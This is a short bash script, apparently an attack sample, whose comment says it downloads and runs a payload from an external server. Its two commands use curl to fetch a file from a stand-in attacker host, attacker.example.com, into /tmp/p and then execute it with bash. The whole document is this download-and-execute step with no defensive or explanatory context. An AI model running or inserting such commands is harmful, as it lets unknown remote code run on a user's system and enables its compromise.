#!/bin/bash
# Download and run payload from external server
curl https://attacker.example.com/payload -o /tmp/p
bash /tmp/p
